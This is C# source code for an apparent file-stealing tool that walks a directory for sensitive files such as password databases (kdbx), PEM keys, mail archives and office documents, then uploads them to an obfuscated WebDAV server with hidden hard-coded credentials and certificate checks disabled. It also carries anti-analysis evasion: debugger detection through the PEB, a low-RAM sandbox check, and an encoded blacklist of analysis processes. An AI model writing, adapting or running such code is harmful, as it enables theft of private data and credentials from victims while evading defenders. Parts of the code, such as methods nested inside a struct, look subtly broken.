using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Collections.Generic;

class Program
{
    private static readonly HashSet<string> AllowedExtensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        "bak", "zip", "pst", "htm", "WPD", "eml", "doc", "xlsx", "xls", "docx", "pdf", "txt", "csv", "kdbx",
        "crd", "pem", "CNF", "msg"
    };

    // Encoded process names (XOR + ROT13)
    private static readonly List<string> BlacklistedProcesses = new List<string>
    {
       "^`{ymnu{o" , "SRRCZXA" , "B`zzry{" , "l{swqst" , "l{swqst?=" , "l{swydl" , "l{swydl?=" , ")mcmqst" , ")mcmqst?=" , "L{swymmNuwoy{" , "~`tzxad1?" , "~`tzxad?=" , "d:;zxa" , "d?=zxa" , "d1?zxa" , "lc}nst"
    };

    [StructLayout(LayoutKind.Sequential)]
    private struct PEB
    {
        public byte InheritedAddressSpace;
        public byte ReadImageFileExecOptions;
        public byte BeingDebugged;
        public byte Reserved;
        public IntPtr Mutant;
        public IntPtr ImageBaseAddress;
        public IntPtr Ldr;
        public IntPtr ProcessParameters;
        public IntPtr SubSystemData;
        public IntPtr ProcessHeap;
        public IntPtr FastPebLock;
        public IntPtr AtlThunkSListPtr;
        public IntPtr IFEOKey;
        public uint NtGlobalFlag;

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }

        private const int ProcessBasicInformation = 0;

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

        public static bool IsBeingDebugged()
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int status = NtQueryInformationProcess(Process.GetCurrentProcess().Handle, ProcessBasicInformation, ref pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out _);
            if (status != 0) return false;

            PEB peb = Marshal.PtrToStructure<PEB>(pbi.PebBaseAddress);
            return (peb.NtGlobalFlag & 0x70) != 0; // Check NtGlobalFlag
        }

        static async Task Main(string[] args)
        {
            // Check if the system has less than 2GB of RAM
            if (IsLowMemory())
            {
                Console.WriteLine("[!] Low memory detected! Exiting...");
                Environment.Exit(0);
            }

            // Check for debugger
            if (IsBeingDebugged())
            {
                Console.WriteLine("[!] Debugger detected! Exiting...");
                Process.GetCurrentProcess().Kill();
            }

            // Check for blacklisted processes
            if (IsBlacklistedProcessRunning())
            {
                Console.WriteLine("[!] Blacklisted process detected! Exiting...");
                Process.GetCurrentProcess().Kill();
            }

            Console.WriteLine("No debugger or blacklisted process detected. Running normally.");

            if (args.Length == 0)
            {
                Console.WriteLine("Usage: <program> <directory_path>");
                return;
            }

            string rootDirectory = args[0];

            if (!Directory.Exists(rootDirectory))
            {
                Console.WriteLine("Directory does not exist.");
                return;
            }

            List<string> files = new List<string>();

            try
            {
                // Scan files safely without yield return
                foreach (string file in GetFilesSafe(rootDirectory))
                {
                    if (AllowedExtensions.Contains(Path.GetExtension(file).TrimStart('.')) && new FileInfo(file).Length <= 50 * 1024 * 1024)
                    {
                        files.Add(file);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error scanning directory: {ex.Message}");
            }

            if (files.Count == 0)
            {
                Console.WriteLine("No files found to upload.");
                return;
            }

            Console.WriteLine($"Found {files.Count} files to upload. Uploading in parallel...");

            // Uploading files in parallel while handling individual errors
            var uploadTasks = files.Select(file => UploadFileToWebDav(file)).ToList();

            // Ensure that we await all uploads, even if some fail
            await Task.WhenAll(uploadTasks);

            Console.WriteLine("All files processed.");
        }

        private static async Task UploadFileToWebDav(string filePath)
        {
            try
            {
                string encodedUrl = "n}}lm3&&yduqlry'wsq";
                string encodedUsername = "\my{";
                string encodedPassword = "Lumm~s{z";

                string webDavUrl = Decode(encodedUrl);
                string username = Decode(encodedUsername);
                string password = Decode(encodedPassword);

                HttpClientHandler handler = new HttpClientHandler
                {
                    ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
                };

                using (HttpClient client = new HttpClient(handler))
                {
                    client.Timeout = TimeSpan.FromSeconds(300); // Imposta il timeout a 300 secondi (5 minuti)

                    var credentials = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{username}:{password}"));
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", credentials);

                    byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                    ByteArrayContent content = new ByteArrayContent(fileBytes);
                    content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

                    string remotePath = $"{webDavUrl}/{Path.GetFileName(filePath)}";
                    HttpResponseMessage response = await client.PutAsync(remotePath, content);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Uploaded: {filePath} -> {remotePath}");
                    }
                    else
                    {
                        Console.WriteLine($"Upload failed for {filePath}. Status Code: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error uploading {filePath}: {ex.Message}");
            }
        }

        private static string Decode(string input)
        {
            return Encoding.UTF8.GetString(XorWithKey(Rot13(input), 0x09));
        }

        private static string Rot13(string input)
        {
            return new string(input.Select(c =>
            {
                if ('a' <= c && c <= 'z') return (char)('a' + (c - 'a' + 13) % 26);
                if ('A' <= c && c <= 'Z') return (char)('A' + (c - 'A' + 13) % 26);
                return c;
            }).ToArray());
        }

        private static byte[] XorWithKey(string input, byte key)
        {
            return input.Select(c => (byte)(c ^ key)).ToArray();
        }

        // Function to scan files recursively
        private static List<string> GetFilesSafe(string directory)
        {
            var files = new List<string>();
            try
            {
                // Add files from the current directory
                files.AddRange(Directory.GetFiles(directory));

                // Recursively process subdirectories
                foreach (string subDir in Directory.GetDirectories(directory))
                {
                    try
                    {
                        files.AddRange(GetFilesSafe(subDir));
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Skipping directory due to access issues: {subDir}");
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"Access denied to directory: {directory}");
            }

            return files;
        }

        // Function to check if any blacklisted processes are running
        private static bool IsBlacklistedProcessRunning()
        {
            // Decode the blacklisted processes
            var blacklistedProcessesDecoded = BlacklistedProcesses.Select(Decode).ToList();

            // Get the names of currently running processes
            var runningProcesses = Process.GetProcesses().Select(p => p.ProcessName).ToList();

            // Check if any blacklisted process is running
            foreach (var process in runningProcesses)
            {
                if (blacklistedProcessesDecoded.Contains(process))
                {
                    return true;
                }
            }

            return false;
        }
        // Function to check if the total memory is below 2GB
        private static bool IsLowMemory()
        {
            // Create a WQL query to fetch the physical memory information
            ObjectQuery wql = new ObjectQuery("SELECT * FROM Win32_PhysicalMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wql);
            ManagementObjectCollection results = searcher.Get();

            long totalMemoryKB = 0;

            // Iterate over all physical memory modules to sum the total memory
            foreach (ManagementObject result in results)
            {
                totalMemoryKB += Convert.ToInt64(result["Capacity"]);
            }

            // Convert the total memory to GB
            double totalMemoryGB = Math.Round((totalMemoryKB / (1024.0 * 1024 * 1024)), 2);
            Console.WriteLine("Total physical memory size: " + totalMemoryGB + " GB");

            // Check if total memory is 2GB or less
            long twoGBInKB = 2L * 1024 * 1024 * 1024;  // 2GB in KB using long
            if (totalMemoryKB <= twoGBInKB)
            {
                return true;
            }

            return false;
        }
    }
   }




